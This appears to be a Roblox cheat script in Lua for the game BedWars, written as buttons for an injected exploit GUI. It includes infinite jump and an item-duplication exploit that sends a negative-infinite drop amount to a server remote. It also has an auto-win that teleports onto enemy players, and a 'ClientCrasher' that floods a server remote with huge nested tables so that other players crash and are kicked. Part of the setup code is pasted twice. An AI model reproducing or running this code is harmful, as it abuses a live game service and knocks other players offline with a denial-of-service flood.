repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until shared.GuiLibrary
local GuiLibrary = shared.GuiLibrary
local ScriptSettings = {}
local UIS = game:GetService("UserInputService")
local COB = function(tab, argstable)

end

infjump = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
    ["Name"] = "infjump",
    ["Function"] = function(callback)
        if callback then
        game:GetService("UserInputService").JumpRequest:connect(function()
            if callback then
                game:GetService "Players".LocalPlayer.Character:FindFirstChildOfClass 'Humanoid':ChangeState("Jumping")
            end
                        
        end)
                end
    end,
    ["HoverText"] = "hold spacebar to jump forever"
})




	local FastDrop = {["Enabled"] = false}
	FastDrop = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
		["Name"] = "Dupe",
		["Function"] = function(callback)
			if callback then
				local monkey = getEquipped()
				if monkey and monkey["Object"] and monkey.amount ~= math.huge then 
					local newitem = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
						item = monkey["Object"],
						amount = -(math.huge)
					})
					if newitem then 
						newitem:Destroy()
					end
				end
				FastDrop["ToggleButton"](false)
			end
		end
	})




























repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until shared.GuiLibrary
local GuiLibrary = shared.GuiLibrary
local ScriptSettings = {}
local UIS = game:GetService("UserInputService")
local COB = function(tab, argstable)

end

local function createwarning(title, text, delay)
    local suc, res = pcall(function()
        local frame = GuiLibrary["CreateNotification"](title, text, delay, "assets/WarningNotification.png")
        frame.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
        return frame
    end)
    return (suc and res)
end

autowin = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
    ["Name"] = "AutoWin",
    ["Function"] = function(callback)
        if callback then
            pcall(function()
                game.Workspace.Gravity = 0
                for i, v in pairs(game.Players:GetPlayers()) do
                    if v.Team == game:GetService("Players").LocalPlayer.Team and v ~=
                        game:GetService("Players").LocalPlayer then
                        v:Destroy()
                    end
                end
                local Players = game:GetService("Players")
                getgenv().Autowin = true
                createwarning("AutoWin", "Autowinning...", 100000000)
                while getgenv().Autowin do
                    for _, v in pairs(Players:GetPlayers()) do
                        if v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character.Humanoid.Health ~=
                            0 and v ~= Players.LocalPlayer then
                            repeat
                                Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart
                                                                                            .CFrame
                                task.wait(0.2)
                            until v.Character.Humanoid.Health <= 0
                        end
                    end
                    task.wait()
                end
            end)
        else
            pcall(function()
                getgenv().Autowin = false
                game.Workspace.Gravity = 196.2
                createwarning("AutoWIn", "sorry, unable to revert changes.", 3)
            end)
        end
    end,
    ["HoverText"] = "autowins if u have disabled anticheat"
})







    
    









ClientCrasher = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
    ["Name"] = "ClientCrasher",
    ["Function"] = function(callback)
        if callback then
            while wait(0.6) do --// don't change it's the best
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                local function getmaxvalue(val)
                   local mainvalueifonetable = 499999
                   if type(val) ~= "number" then
                       return nil
                   end
                   local calculateperfectval = (mainvalueifonetable/(val+2))
                   return calculateperfectval
                end
            
                local function bomb(tableincrease, tries)
                local maintable = {}
                local spammedtable = {}
            
                table.insert(spammedtable, {})
                z = spammedtable[1]
            
                for i = 1, tableincrease do
                    local tableins = {}
                    table.insert(z, tableins)
                    z = tableins
                end
            
                local calculatemax = getmaxvalue(tableincrease)
                local maximum
            
                if calculatemax then
                     maximum = calculatemax
                     else
                     maximum = 999999
                end
            
                for i = 1, maximum do
                     table.insert(maintable, spammedtable)
                end
            
                for i = 1, tries do
                     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                end
                end
            
                bomb(250, 2) --// change values if client crashes.
                
            end
    end
end,
    ["HoverText"] = "if good pc will crash ONLY others so much they get kicked (extremely overpowered)"
})



